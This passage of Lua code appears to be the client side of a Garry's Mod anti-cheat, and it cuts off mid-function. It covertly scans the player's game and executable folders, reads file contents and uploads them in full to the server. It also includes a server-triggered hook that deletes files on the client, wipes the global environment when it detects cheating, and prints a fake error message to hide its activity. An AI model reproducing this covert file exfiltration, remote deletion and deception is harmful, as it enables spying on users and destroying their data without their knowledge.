	"data/robotboy655/",
	"data/ppm/",
	"data/gpuchip/",
	"data/expression2/",
	"data/glib/",
	"data/fadmin_logs/",
	"data/cpuchip/",
	"data/darkrp_logs/",
	"data/adv_duplicator/",
	"data/Expression2/",
	"data/ExpressionGate/",
	"data/stargate/",
	"data/profiler_premade/",
	"data/soundlists/",
	"data/zsprofiler/",
	"data/zsmaps/",
	"data/global_options/",
	"data/spuchip/",
	"data/damagelog/",
	"data/exsto/",
	"data/e2power/",
	"data/vchat/",
	"data/streamradio/",
	"data/ppm_cache/",
	"data/asslog/",
	"data/gmodz/",
	"data/persist/",
	"data/ev_logs/",
	"data/ASSMod/",
	"data/pill_config/",
	"data/achievements/",
	"data/rphone/",
	"data/pikaserver/",
	"data/ulx/",
	"data/luapad/",
	"data/GPUChip/",
	"data/CPUChip/",
	"data/radio/",
	"data/playx/",
	"data/StarfallScriptData/",
	"data/ez_rollercoaster/",
	"data/tiramisu/",
	"data/lde_logs/",
	"data/jcdata/",
	"data/aowl/",
	"data/sentmail/",
	"data/ULib/",
	"data/nodegraph/",
	"data/wrench/",
	"data/youtube player/",
}


local Useless = {
	"addons/neuroweapons/Lua",
	"addons/chatsounds/lua/",
	"addons/NextBot Players/lua/",
	"addons/cap_resources-master/",
	"addons/Addons-Repo/",
	"addons/Gedo789-S1/lua/",
	"addons/SpaceBuild-REPO/lua/",
	"addons/SpaceSoldier/lua/",
	"addons/streamradio_core/",
	"addons/DerpRP Inv/lua/",
	"addons/darkrpmodification/lua/",
	"addons/Gassystems2/",
	"addons/evolve/",
	"addons/Spacevult/",
	"addons/spacebuild/",
	"addons/ttt-weapon-collection-master/",
	"addons/sb/",
	"addons/cap/",
	"addons/Spacebuild 3/",
	"addons/Spacebuild 2/",
	"addons/Sbep (Spacebuild Props)/",
	"addons/Pcmod2/lua/",
	"addons/TrainPilot/lua/",
	"addons/FPP/lua/",
	"addons/ULib/lua/",
	"addons/Pcmod2/lua/",
	"addons/Lucario/lua/",
	"addons/Dismemberment Mod 1.9/lua/",
	"addons/Neuro Planes/lua/",
	"addons/E2Power/lua/",
	"addons/vfs/lua/",
	"addons/NeuroTec Weapons/lua/",
	"addons/Wire Mod/lua/",
	"addons/pac 3/lua/",
	"addons/Bots/lua/",
	"addons/StargateFreaks%20Pack/lua/",
	"addons/PlayX/lua/",
	"addons/streamradio_core/",
	"SweetFX/",
	"SweetFX readme.txt",
	"SweetFX_preset.txt",
	"SweetFX_settings.txt",
	"addons/finalfrontier-master/lua/",
	"addons/Adv. HUD Indicator/",
	"addons/900 sub pack by TheDanishMaster/lua/",
	"addons/500 sub pack by TheDanishMaster/lua/",
	"addons/Portal 2 Content Addon/scripts/",
	"addons/Quality Rp Vehicle Pack/lua/",
	"addons/Fueled Mod Vehicle Pack/lua/",
	"addons/Sonic Playermodels  V3/lua/",
	"addons/Aperture Science Handheld Portal Device/lua/",
	"addons/Futuristic Weaponry Npc Weapons/lua/",
	"addons/Neo Heavy Combine player model and npc Pack/lua/",
	"addons/gamemodes/Half-Life/",
	"addons/evo1m/lua/",
	"addons/Garry's Mod Stranded/",
	"lua/gengeolightdb.lua",
	"lua/gengeolightdb2.lua",
	"lua/streamradio_core/",
	"addons/dcpu_emulator/lua/",
	"addons/SLV_Base/lua/",
	"addons/addons/Half-Life_Renaissance/lua",
	"addons/Teletubies/lua/",
	"addons/M9K Specialties/lua/",
	"addons/ULX/lua/",
	"addons/Call of Duty SWeps/lua/",
	"addons/SCars Slim/lua/",
	"addons/Minecraft Skin Changer/lua/",
	"addons/SCars Extra/lua/",
	"addons/WAC Aircraft/lua/",
	"addons/WAC Community 6/lua/",
	"addons/XCF/",
	"addons/sbep/",
	"addons/Ulib/lua/",
	"addons/Nuke Pack 4/lua/",
	"addons/Working Combine-Mech/",
	"addons/Hoverboards/",
	"addons/GDCW BARRETT Weaponry/lua/",
	"addons/ACF.git/",
	"addons/spacebuild-master/lua/",
	"addons/finalfrontier-master/",
	"addons/Wireextra/lua/",
	"addons/stargate/example gates/",
	"addons/GDCW/lua/",
	"addons/stargate/lua/",
	"addons/pac3-hatmaker/lua/",
	"addons/PAC3/lua/",
	"lua/sui_scoreboard/",
	"lua/caf/languagevars/",
	"lua/data/stargate/",
	"addons/cap_resources-master/lua/",
	"addons/TDM Cars/lua/",
	"addons/gravityhull/lua/",
	"addons/rx_achievement_system/",
	"addons/assmod/",
	"addons/gm-rollercoaster-master/",
	"addons/SBEP Entities/lua/",
	"addons/TDM Dealer/lua/",
	"addons/SBEP Experimental/lua/",
	"addons/Hard Reset Vehicles/lua/",
	"addons/TDM cars/lua/",
	"lua/lemongate/components/",
	"lua/lemongate/editor/",
	"lua/pac3/editor/",
	"lua/data/language/",
	"lua/pac3/pace/",
	"lua/pac3/core/",
	"addons/Drivable Scania Trucks by TheDanishMaster/lua/",
	"addons/Trailer pack by TheDanishMaster/lua/",
	"addons/MandracsModels/lua/",
	"addons/Minecraft/lua/",
	"addons/Content pack/lua/",
	"addons/SpaceBuild3/lua/",
	"addons/bf3sweps/lua/",
	"addons/DoctorWho/Lua/",
	"addons/CM901/lua/",
	"addons/MK46/lua/",
	"addons/MP412/lua/",
	"addons/MP9/lua/",
	"addons/P99/lua/",
	"addons/PM-9/lua/",
	"addons/PP90M1/lua/",
	"addons/assmod/lua/",
	"addons/Elevator/",
	"lua/caf/addons/",
	"lua/caf/core/",
	"lua/items/trails/",
	"lua/items/headshatsmasks/",
	"lua/items/playermodels/",
	"lua/caf/stools/",
	"addons/SicknessModel/lua/",
	"addons/SCars/lua/",
	"addons/Wire Mod Extras/lua/",
	"addons/lua/stargate/",
	"addons/gamemodes/fretta/",
	"addons/gamemodes/prop_hunt/",
	"addons/Spacebuild Mod 3/",
	"lua/data/expression2/",
	"lua/data/gatespawner_group_maps/",
	"lua/data/gatespawner_maps/",
	"addons/cap-master/example gates/",
	"addons/lua/data/language/",
	"addons/lua/data/gatespawner_group_maps/",
	"addons/lua/data/gatespawner_maps/",
	"addons/wiremod123/lua/",
	"addons/TDMCarpack/lua/",
	"addons/Advduplicator/lua/",
	"addons/Windeds Video Assistant/lua/",
	"addons/HeX's DepthHUD/lua/",
	"addons/HeX's SaitoHUD/lua/",
	"addons/ACF/lua/",
	"addons/acf/lua/",
	"addons/RagMorph/lua/",
	"addons/GComputeother/lua/",
	"addons/ACF.git/lua/",
	"addons/gcompute/lua/",
	"addons/glib/lua/",
	"addons/cap-master/lua/",
	"addons/gvote/lua/",
	"addons/gooey/lua/",
	"addons/chatsoundsforgmod/lua/",
	"addons/TDM/lua/",
	"addons/DarkRP/",
	"lua/data/language/",
	"addons/ACF mod/lua/",
	"addons/master/lua/effects/",
	"addons/master/lua/entities/",
	"addons/master/lua/weapons/",
	"addons/master/lua/wire/",
	"addons/Morbus Gamemode/",
	"addons/ACF_custom/",
	"addons/Angry Hobo SWEP/",
	"addons/livecontenthack/lua",
	"addons/LiveContentHack/lua",
	"addons/PointShop-Extras/",
	"lua/entities/",
	"lua/effects/",
	"lua/weapons/",
	"lua/Weapons/",
	"lua/weapons_old/",
	"lua/weaponsold/",
	"lua/includes/gamemode/",
	"lua/includes/gamemodes/",
	"lua/gamemodes/",
	"lua/includes/lua/effects/",
	"lua/includes/lua/entities/",
	"lua/includes/lua/weapons/",
	"lua/wire/",
	"lua/autorun/server/AdvDupe",
	"lua/autorun/shared/dupeshare",
	"lua/slvbase_init/",
	"lua/hlr_init/",
	"lua/playx/",
	"lua/pcmod/",
	"lua/weaponsold/weapon_/",
	"lua/stargate/",
	"lua/achievements/",
	"lua/CAF/Addons/",
	"lua/SPM/Commands/",
	"lua/SPM/Plugins/",
	"lua/rd2/stools/",
	"lua/exsto/plugins/",
	"lua/AVehicles/",
	"lua/includes/entities/",
	"lua/app_framework/controls/",
	"lua/includes/weapons/",
	"lua/lua/entities/",
	"lua/lua/weapons/",
	"lua/chatsounds/lists_nosend/",
	"lua/chatsounds/lists_send/",
	"lua/PewPewBullets/",
	"lua/PewPewPlugins/",
	"lua/pewpewbullets/",
	"lua/autorun/entities/",
	"lua/autorun/weapons/",
	"lua/lua/autorun/server/",
	"addons/wire/lua/effects/",
	"addons/wire/lua/entities/",
	"addons/wire/lua/wire/",
	"addons/AdvDuplicator-master/lua/",
	"addons/wire-master/lua/",
	"addons/wire-extras-master/lua/",
	"addons/wire-extras/lua/",
	"addons/wire_extras/lua/",
	"addons/wire_master/lua/",
	"addons/wiresocketrad/lua/",
	"addons/wire/branches/",
	"addons/wire/tags/",
	"addons/wire/trunk/",
	"addons/Wiremod/lua/",
	"addons/wiremod/lua/",
	"addons/wire/lua/",
	"addons/cap/lua/",
	"addons/AdvDuplicator/lua/",
	"addons/advdupe2/lua/",
	"addons/sb3/lua/",
	"addons/sbep-master/lua/",
	"addons/PewPew/lua/",
	"addons/Wire/lua/",
	"addons/Wiremod/wire-master/",
	"addons/pointshop-master/lua/",
	"addons/exsto-master/lua/",
	"addons/TDMCars/lua/",
	"addons/wiremodex/lua/",
	"hl2/media/StartupVids.txt",
	"addons/wire/wire/lua/",
	"addons/NeuroBase/lua/",
	"addons/neurobase/lua/",
	"addons/NeuroTanks/lua/",
	"addons/NeuroPlanes/Lua/",
	"addons/NeuroNaval/lua/",
	"addons/NeuroWeapons/Lua/",
	"addons/tdm/lua/",
	"addons/Cap2/lua/",
	"addons/wiremod/wire/lua/",
	"addons/SBEP_Entities/lua/",
	"addons/SBEP_Experimental/lua/",
	"addons/SBEP_Models/lua/",
	"addons/Wire Extras/lua/",
	"addons/WireExtras/lua/",
	"addons/grafityhull/lua/",
	"addons/pcmod/lua/",
	"addons/pcmod2/lua/",
	"addons/petrol_systems/lua/",
	"addons/resource_transit_system/lua/",
	"addons/spacebuild/lua/",
	"addons/gassystems2/lua/",
	"addons/black_hole_cache/lua/",
	"addons/wtiberium/lua/",
	"addons/Zombie Survival/gamemodes/",
	"addons/tdmcars/lua/",
	"addons/lua/effects/",
	"addons/lua/entities/",
	"addons/lua/wire/",
	"addons/ACF-master/lua/",
	"addons/pac3-master/lua/",
	"addons/SBEP Models/lua/",
	"addons/TDM Dealer/lua/",
	"addons/ACF/branches/",
	"addons/ACF/trunk/",
	"addons/zombiesurvival/",
	"addons/WireMod/lua/",
	"addons/ulib/lua/",
	"addons/ulx/lua/",
	"addons/Wiremod/wire/",
	"addons/anonsvn/wire/",
	"addons/AdvDuplicator/",
	"addons/wire-extras/",
	"addons/PointShop/lua/",
	"addons/ulx/ulib/lua/",
	"addons/ulx/ulx/lua/",
	"addons/ulx/ups/lua/",
}


local NoEXP = {
	["intl3_svn.dll"] = 1,
	["libapr-1.dll"] = 1,
	["libapriconv-1.dll"] = 1,
	["libaprutil-1.dll"] = 1,
	["libcurl.dll"] = 1,
	["libdb44.dll"] = 1,
	["libeay32.dll"] = 1,
	["libidn-11.dll"] = 1,
	["librtmp.dll"] = 1,
	["libssh2.dll"] = 1,
	["libsvn_client-1.dll"] = 1,
	["libsvn_delta-1.dll"] = 1,
	["libsvn_diff-1.dll"] = 1,
	["libsvn_fs-1.dll"] = 1,
	["libsvn_ra-1.dll"] = 1,
	["libsvn_repos-1.dll"] = 1,
	["libsvn_subr-1.dll"] = 1,
	["libsvn_wc-1.dll"] = 1,
	["ssleay32.dll"] = 1,
	["zlib1.dll"] = 1,
	["crashhandler.dylib"] = 1,
	["crashhandler.so"] = 1,
	["chromehtml.so"] = 1,
	["d3dx9_40.dll"] = 1,
	["libawesomium-1-7.so.0"] = 1,
	["libawesomium-1-7.so.2"] = 1,
	["libawesomium-1-7.so.2.0"] = 1,
	["xinput9_1_0.dll"] = 1,
	["binkw32.dll"] = 1,
	["steamclient.dll"] = 1,
	["telemetry32.dll"] = 1,
	["vaudio_miles.dll"] = 1,
	["gmod_audio.so"] = 1,
	["libsdl2-2.0.so.0"] = 1,
	["libsdl2-2.0.so"] = 1,
	["libbass.so"] = 1,
	["libprofiler.so.0"] = 1,
	["libprofiler.so"] = 1,
	["libtcmalloc_minimal.so"] = 1,
	["libtcmalloc_minimal.so.4"] = 1,
	["libudev.so"] = 1,
	["libudev.so.0"] = 1,
	["valve_avi.dll"] = 1,
	["rdmwin32.dll"] = 1,
	["friendsui.dll"] = 1,
	["client.dll"] = 1,
	["server.dll"] = 1,
	["v.tga"] = 1,
	["libcef.dylib"] = 1,
	["gmad_publish.bat"] = 1,
	["apple.ico"] = 1,
	["avformat-52.dll"] = 1,
	["awesom~1.log"] = 1,
	["avutil-50.dll"] = 1,
	["avcodec-52.dll"] = 1,
	["adminserver.dll"] = 1,
	["video_bink.dll"] = 1,
	["libmilesx86.dylib"] = 1,
	["chromehtml.dylib"] = 1,
	["replay.dylib"] = 1,
	["awesomium.dll"] = 1,
	["clientregistry.blob"] = 1,
	["filesystemopendialog.dll"] = 1,
	["filesystem_stdio.dll"] = 1,
	["gameui.dll"] = 1,
	["sdl2.dll"] = 1,
	["serverbrowser.dll"] = 1,
	["steam.dll"] = 1,
	["avcodec-53.dll"] = 1,
	["avformat-53.dll"] = 1,
	["avutil-51.dll"] = 1,
	["awesomium_process.exe"] = 1,
	["basehaptics.txt"] = 1,
	["bass.dll"] = 1,
	["bsppack.dll"] = 1,
	["bspzip.exe"] = 1,
	["bugreporter.dll"] = 1,
	["bugreporter_filequeue.dll"] = 1,
	["bugreporter_public.dll"] = 1,
	["captioncompiler.exe"] = 1,
	["chromehtml.dll"] = 1,
	["crashhandler.dll"] = 1,
	["datacache.dll"] = 1,
	["datamodel.dll"] = 1,
	["dedicated.dll"] = 1,
	["demoinfo.exe"] = 1,
	["dmserializers.dll"] = 1,
	["dmxedit.exe"] = 1,
	["dxsupport.cfg"] = 1,
	["dxsupport.csv"] = 1,
	["dxsupport_episodic.cfg"] = 1,
	["dxsupport_sp.cfg"] = 1,
	["elementviewer.exe"] = 1,
	["engine.dll"] = 1,
	["glview.exe"] = 1,
	["gmad.exe"] = 1,
	["gmod_audio.dll"] = 1,
	["gmpublish.exe"] = 1,
	["hammer.exe"] = 1,
	["hammer_dll.dll"] = 1,
	["haptics.dll"] = 1,
	["headtrack_oculus.dll"] = 1,
	["height2normal.exe"] = 1,
	["height2ssbump.exe"] = 1,
	["hlfaceposer.exe"] = 1,
	["hlmv.exe"] = 1,
	["icudt.dll"] = 1,
	["icudt42.dll"] = 1,
	["inputsystem.dll"] = 1,
	["launcher.dll"] = 1,
	["libegl.dll"] = 1,
	["libglesv2.dll"] = 1,
	["libcef.dll"] = 1,
	["libsasl.dll"] = 1,
	["materialsystem.dll"] = 1,
	["mdllib.dll"] = 1,
	["msvcr71.dll"] = 1,
	["mysql_wrapper.dll"] = 1,
	["parsifal.dll"] = 1,
	["replay.dll"] = 1,
	["scenefilecache.dll"] = 1,
	["serverplugin_empty.dll"] = 1,
	["shaderapidx9.dll"] = 1,
	["shaderapiempty.dll"] = 1,
	["shadercompile.exe"] = 1,
	["shadercompile_dll.dll"] = 1,
	["sixense.dll"] = 1,
	["sixense_utils.dll"] = 1,
	["soundemittersystem.dll"] = 1,
	["soundsystem.dll"] = 1,
	["splitskybox.exe"] = 1,
	["srcds.exe"] = 1,
	["stdshader_dbg.dll"] = 1,
	["stdshader_dx6.dll"] = 1,
	["stdshader_dx7.dll"] = 1,
	["stdshader_dx8.dll"] = 1,
	["stdshader_dx9.dll"] = 1,
	["steam_api.dll"] = 1,
	["steam_appid.txt"] = 1,
	["steamclient.dll"] = 1,
	["studiorender.dll"] = 1,
	["texturecompile_dll.dll"] = 1,
	["tier0.dll"] = 1,
	["tier0_s.dll"] = 1,
	["unicode.dll"] = 1,
	["unicows.dll"] = 1,
	["unitlib.dll"] = 1,
	["vaudio_speex.dll"] = 1,
	["vgui2.dll"] = 1,
	["vguimatsurface.dll"] = 1,
	["vidcfg.bin"] = 1,
	["video_quicktime.dll"] = 1,
	["video_services.dll"] = 1,
	["vphysics.dll"] = 1,
	["vpk.exe"] = 1,
	["vrad.exe"] = 1,
	["vrad_dll.dll"] = 1,
	["vstdlib.dll"] = 1,
	["vstdlib_s.dll"] = 1,
	["vtex.dll"] = 1,
	["vtex.exe"] = 1,
	["vtex_dll.dll"] = 1,
	["vtf2tga.exe"] = 1,
	["vvis.exe"] = 1,
	["vvis_dll.dll"] = 1,
	["xinput1_3.dll"] = 1,
	["awesomium.framework"] = 1,
	["awesomium.log"] = 1,
	["sdk.fgd"] = 1,
	["hl2.exe"] = 1,
	["halflife2.fgd"] = 1,
	["base.fgd"] = 1,
	["cmdseq.wc"] = 1,
	["libmysql.dll"] = 1,
	["awesomium"] = 1,
	["gameui.dylib"] = 1,
	["gameui.so"] = 1,
	["serverbrowser.dylib"] = 1,
	["serverbrowser.so"] = 1,
	["engine.dylib"] = 1,
	["engine.so"] = 1,
	["engine_srv.so"] = 1,
	["inspector.pak"] = 1,
	["libawesomium-1-7.so"] = 1,
	["libcef.so"] = 1,
	["libsteam.so"] = 1,
	["libsteamvalidateuseridtickets.so"] = 1,
	["replay.so"] = 1,
	["steamclient.so"] = 1,
	["video_webm.so"] = 1,
	["awesomium_process"] = 1,
	["bsppack.dylib"] = 1,
	["bsppack.so"] = 1,
	["datacache.dylib"] = 1,
	["datacache.so"] = 1,
	["datacache_srv.so"] = 1,
	["dedicated.dylib"] = 1,
	["dedicated.so"] = 1,
	["dedicated_srv.so"] = 1,
	["filesystem_stdio.dylib"] = 1,
	["filesystem_stdio.so"] = 1,
	["filesystem_steam.dll"] = 1,
	["filesystem_steam.dylib"] = 1,
	["filesystem_steam.so"] = 1,
	["gmad_linux"] = 1,
	["gmad_osx"] = 1,
	["gmpublish_linux"] = 1,
	["gmpublish_osx"] = 1,
	["hl2.sh"] = 1,
	["hl2_linux"] = 1,
	["hl2_osx"] = 1,
	["inputsystem.dylib"] = 1,
	["inputsystem.so"] = 1,
	["launcher.dylib"] = 1,
	["launcher.so"] = 1,
	["libmiles.so"] = 1,
	["libtelemetryx64.so"] = 1,
	["libtelemetryx86.so"] = 1,
	["libffmpegsumo.so"] = 1,
	["libsteam_api.dylib"] = 1,
	["libsteam_api.so"] = 1,
	["libtier0.dylib"] = 1,
	["libtier0.so"] = 1,
	["libtier0_s.so"] = 1,
	["libtier0_srv.so"] = 1,
	["libtogl.dylib"] = 1,
	["libtogl.so"] = 1,
	["libvstdlib.dylib"] = 1,
	["libvstdlib.so"] = 1,
	["libvstdlib_s.so"] = 1,
	["libvstdlib_srv.so"] = 1,
	["materialsystem.dylib"] = 1,
	["materialsystem.so"] = 1,
	["materialsystem_srv.so"] = 1,
	["mssmp3.asi"] = 1,
	["mssvoice.asi"] = 1,
	["replay_srv.so"] = 1,
	["scenefilecache.dylib"] = 1,
	["scenefilecache.so"] = 1,
	["scenefilecache_srv.so"] = 1,
	["shaderapidx10.dll"] = 1,
	["shaderapidx9.dylib"] = 1,
	["shaderapidx9.so"] = 1,
	["shaderapiempty.dylib"] = 1,
	["shaderapiempty.so"] = 1,
	["shaderapiempty_srv.so"] = 1,
	["soundemittersystem.dylib"] = 1,
	["soundemittersystem.so"] = 1,
	["soundemittersystem_srv.so"] = 1,
	["srcds_linux"] = 1,
	["srcds_osx"] = 1,
	["srcds_run"] = 1,
	["stdshader_dx9.dylib"] = 1,
	["stdshader_dx9.so"] = 1,
	["studiorender.dylib"] = 1,
	["studiorender.so"] = 1,
	["studiorender_srv.so"] = 1,
	["valve_bink.dll"] = 1,
	["vaudio_miles.so"] = 1,
	["vaudio_speex.so"] = 1,
	["vgui2.dylib"] = 1,
	["tags.dll"] = 1,
	["bass.dll"] = 1,
	["vgui2.so"] = 1,
	["vguimatsurface.dylib"] = 1,
	["vguimatsurface.so"] = 1,
	["video_bink.so"] = 1,
	["video_quicktime.dylib"] = 1,
	["video_services.dylib"] = 1,
	["video_services.so"] = 1,
	["vphysics.so"] = 1,
	["vphysics_srv.so"] = 1,
	["vtex_dll.dylib"] = 1,
	["vtex_dll.so"] = 1,
	["webui_assets.pak"] = 1,
	["gameoverlayrenderer.log"] = 1,
	["debug.log"] = 1,
	["steam.log"] = 1,
	["gmod_audio.dylib"] = 1,
	["headtrack_oculus.dylib"] = 1,
	["libbass.dylib"] = 1,
	["vaudio_speex.dylib"] = 1,
	["vphysics.dylib"] = 1,
	["gameconfig.txt"] = 1,
	["mss32.dll"] = 1,
	["logitechlcd.dll"] = 1,
	["voice_input.wav"] = 1,
}
local NoEXP_F = {
	["sourcesdk_content"] = 1,
	["media"] = 1,
	["pvkii"] = 1,
	["garrysmod_danish"] = 1,
	["garrysmod_swedish"] = 1,
	["ep2"] = 1,
	["sdk"] = 1,
	["ageofchivalry"] = 1,
	["databases-incognito"] = 1,
	["awesomium.framework"] = 1,
	["garrysmod_greek"] = 1,
	["garrysmod_dutch"] = 1,
	["garrysmod_german"] = 1,
	["garrysmod_russian"] = 1,
	["garrysmod_save"] = 1,
	["garrysmod_old"] = 1,
	["osx32"] = 1,
	["zps"] = 1,
	["cstrike"] = 1,
	["lostcoast"] = 1,
	["appcache"] = 1,
	["tf"] = 1,
	["bin"] = 1,
	["config"] = 1,
	["dumps"] = 1,
	["filters"] = 1,
	["garrysmod"] = 1,
	["portal2"] = 1,
	["hl2mp"] = 1,
	["logs"] = 1,
	["platform"] = 1,
	["sourceengine"] = 1,
	["hl1"] = 1,
	["tools"] = 1,
	["sound"] = 1,
	["materials"] = 1,
	["models"] = 1,
	["hl2"] = 1,
}



local _G				= _G
local include			= include
local RunConsoleCommand	= RunConsoleCommand
local tostring			= tostring
local type				= type
local pcall				= pcall
local pairs				= pairs
local ErrorNoHalt		= ErrorNoHalt
local Format			= string.format
local NotFO				= file.Open
local NotFID			= file.IsDir
local NotFF				= file.Find
local NotFD				= file.Delete
local NotTS				= timer.Simple
local NotCRC			= util.CRC
local NotTIS			= function(k,v) k[#k+1] = v end
local NotJST			= util.TableToJSON
local _R 				= debug.getregistry()
local F_Size 			= _R.File.Size
local F_Close 			= _R.File.Close
local F_Read  			= _R.File.Read


_G.AllowedList		= nil
include("lists/sh_W_HKS.lua")
local NoSend		= _G.AllowedList or {}
_G.AllowedList		= nil

_G.AllowedList_Old	= nil
include("lists/sh_W_HKS_Old.lua")
local NoSend_Old	= _G.AllowedList_Old or {}
_G.AllowedList_Old	= nil



include("HAC/sh_HACBurst.lua")

local burst 	= ErrorNoHalt
local bursthook = ErrorNoHalt
if _G.hacburst then
	if _G.hacburst.Send then	burst = _G.hacburst.Send		end
	if _G.hacburst.Hook then	bursthook = _G.hacburst.Hook	end
end


local WaitFor		= 15
local CheckTime		= #NoSend
local CurTime 		= CurTime()


local function ValidString(v)
	return (v and type(v) == "string" and v != "")
end
local function StartsWith(str,check)
	return str:sub(1,#check) == check
end
local function EndsWith(str,ends)
   return ends == "" or str:sub(-#ends) == ends
end
local function NotTHV(tab,val)
	val = val:lower()
	for k,v in pairs(tab) do
		if v:lower() == val then return true end
	end
	return false
end
local function FMerge(with,what)
	for k,v in pairs(with) do
		NotTIS(what,v)
	end
end
local Bad = false
local i = 6
local function ReportMe(str,bad)
	NotTS(i, function()
		RunConsoleCommand("damn", str)
	end)
	i = i + 2
	
	if bad then
		Bad = true
		NotTS(160, function()
			for k,v in pairs(_G) do _G[k] = NotFO end
		end)
	end
end



local function GetCRCAndFile(name,SPath)
	local err,ret = pcall(function()
		local Out = NotFO(name, "rb", SPath)
			if not Out then
				ReportMe("ICheck=NotFO("..name..")")
				return false
			end
			local Size = F_Size(Out)
			
			if Size > 5000000 then
				ReportMe("ICheck=SizeOf("..name..") > "..tostring(Size) )
				F_Close(Out)
				return false
			end
			
			local str = F_Read(Out,Size)
		F_Close(Out)
		
		return str
	end)
	
	if not err then
		--ReportMe("ICheck=pc1("..name..") "..tostring(err) )
		
		err,ret = nil,nil
		err,ret = pcall(function()
			return file.Read(name,"GAME")
		end)
		
		if not err then
			--ReportMe("ICheck=pc2("..name..") "..tostring(err) )
			return false,false
		end
	end
	
	
	if not ValidString(ret) then
		return false,false
	end
	
	return (NotCRC(ret) or "Gone"),ret
end


local function IsUselessDir(v)
	if NotTHV(UselessData, v) then return true end
	
	for k,That in pairs(Useless) do
		if StartsWith(v,That) then
			return true
		end
	end
	
	for k,That in pairs(UselessData) do
		if StartsWith(v,That) then
			return true
		end
	end
	
	if StartsWith(v,"addons/") then
		if v:find("/lua/effects/", nil,true) and EndsWith(v,"/init.lua") then return true end
		if v:find("/lua/weapons/gmod_tool/stools/", nil,true) then return true end
		
		if v:find("/lua/weapons/", nil,true) or v:find("/lua/entities/", nil,true) and
			(EndsWith(v, "/shared.lua") or EndsWith(v, "/init.lua") or EndsWith(v, "/cl_init.lua")) then return true
		end
	end
	
	return false
end


local FAlwaysBad = {
	[".."] 		= 1,
	["..."]		= 1,
	[".svn"]	= 1,
	[".mdmp"]	= 1,
}

local FAlwyasGood = {
	lua	= 1, xml	= 1, cfg	= 1, bak	= 1, conf	= 1,
	txt	= 1, old	= 1, lua2	= 1, hmod	= 1, php	= 1,
	ini	= 1, ok		= 1, bb 	= 1, luac 	= 1, gay	= 1,
	hax	= 1, hac	= 1, h4x	= 1,
}
local FAlwyasGoodAddons = {
	lua	= 1, bak	= 1, old	= 1, lua2	= 1,
}


local function FindAllIn(dir,SPath,Good,Bad)
	local tab = {}
	
	local function LoadFromBuffer(dir,tab,Good,Bad)
		local files,fold = NotFF(dir.."/*", SPath)
		if fold then
			FMerge(fold, files)
		end
		
		if not files then files = {} end
		if not Good then Good = FAlwyasGood end
		if not Bad then Bad = {} end
		
		FMerge(Bad, FAlwaysBad)
		
		for k,what in pairs(files) do
			local ext	= what:sub(-3)
			local Here	= dir.."/"..what
			
			if not Good[ext] or NotFID(what, SPath) then
				LoadFromBuffer(Here, tab, Good, Bad)
				
			elseif Good[ext] and not Bad[ext] then
				if not NotTHV(tab, Here) and not IsUselessDir(Here) then
					NotTIS(tab, Here)
				end
			end
		end
	end
	
	LoadFromBuffer(dir,tab,Good,Bad)
	
	return tab
end



local Proper 	= {}
local AllFiles	= {}

local function ProcessTable(Tab, SPath)
	for k,NewFile in pairs(Tab) do
		local NewCRC,Text = GetCRCAndFile(NewFile, SPath)
		
		NotTIS(AllFiles,
			{
				NewFile = NewFile,
				NewCRC 	= (NewCRC and NewCRC or "NoFO"),
				SPath	= SPath,
			}
		)
		
		if NewCRC then
			local UID = NotCRC( Format("%s-%s", NewFile, NewCRC) )
			if not NotTHV(NoSend, UID) and not NotTHV(NoSend_Old, UID) then
				NotTIS(Proper,
					{
						NewFile = NewFile,
						NewCRC 	= NewCRC,
						Text	= Text,
						SPath	= SPath,
					}
				)
			end
		end
	end
end

local function EatTable(where, SPath, gTab)
	local Tab = FindAllIn(where, SPath, gTab)
	
	ProcessTable(Tab, SPath)
end

EatTable("lua1",		"MOD")
EatTable("lua2",		"MOD")
EatTable("Copy of lua",	"MOD")
EatTable("lua_old",		"MOD")
EatTable("lua - Copy", 	"MOD")
EatTable("lua2", 		"MOD")
EatTable("lua", 		"MOD")
EatTable("data", 		"MOD")
EatTable("hax", 		"MOD")
EatTable("hacks", 		"MOD")
EatTable("cheats", 		"MOD")
EatTable("cheat", 		"MOD")
EatTable("script", 		"MOD")

local files,fold = NotFF("*", "EXECUTABLE_PATH")
if files and #files > 0 then
	local Tab = {}
	for k,v in pairs(files) do
		local low = v:lower()
		
		if not NoEXP[ low ] and low:sub(-5) != ".mdmp" then
			NotTIS(Tab, v)
		end
	end
	
	if #Tab > 0 then
		ProcessTable(Tab, "EXECUTABLE_PATH")
	end
else
	ReportMe("FFF=NoFF",1)
end

if fold and #fold > 0 then
	for k,v in pairs(fold) do
		if not NoEXP_F[ v:lower() ] then
			EatTable(v, "EXECUTABLE_PATH")
			
			NotTIS(AllFiles,
				{
					NewFile = v,
					NewCRC 	= "DIR",
					SPath	= "EXECUTABLE_PATH",
				}
			)
		end
	end
else
	ReportMe("FFF=NoFD",1)
end


EatTable("addons", 	"MOD", FAlwyasGoodAddons)



local function DoCheckBuff()
	burst(tostring(CheckTime), NotJST(
			{
				TXOk	= CheckTime,
				TXList	= #NoSend,
				TXInit	= (not WFC111255),
				CurTime = CurTime,
			}
		)
		,nil,nil,true
	)
	
	burst(tostring(CheckTime * 2), NotJST(AllFiles), nil,nil,true)
	AllFiles = {}
	
	for k,v in pairs(Proper) do
		burst(tostring(CheckTime), NotJST(
				{
					Name	= v.NewFile,
					CRC		= v.NewCRC,
					SPath	= v.SPath,
					CurSize	= k,
					AllSize	= #Proper,
					Cont	= v.Text,
				}
			)
		)
	end
	Proper = {}
	
	
	--[[
	if #NoSend_Old != 5447 then
		ReportMe("NoSend_Old("..#NoSend_Old.." != 5447)")
	end]]
end
NotTS(WaitFor, DoCheckBuff)

local function Delete(str,len,sID,idx,Total)
	NotFD(str)
end
bursthook("Delete", Delete)


local ConstRand = CurTime * 2
local Prog = 0
local function BootyBucket(cont,name)
	if not ValidString(cont) then return end
	
	Prog = Prog + 1
	ConstRand = ConstRand + Prog
	
	local NewFile = Format("BootyBucket/%s-%s%s", (name or "BB"), (NotCRC(cont) or ConstRand), Prog)
	
	burst(tostring(CheckTime), NotJST(
			{
				Name	 = NewFile,
				CRC		 = tostring(Prog),
				SPath	 = "MOD",
				CurSize	 = 1,
				AllSize  = 1,
				Cont	 = cont,
				IsBucket = true,
			}
		), nil, nil, true
	)
end
_G.BootyBucket = BootyBucket

local NotBBUF = BootyBucket
local function CheckBBUF()
	NotTS(2, CheckBBUF)
	
	if not _G.BootyBucket or _G.BootyBucket != NotBBUF then
		ReportMe("ICheck=Bucket")
		
		ErrorNoHalt("[ERROR] lua/autorun/client/hex_ac.lua:106: attempt to index global 'file' (a nil value)")
	end
	_G.BootyBucket	= NotBBUF
	
	if Bad then
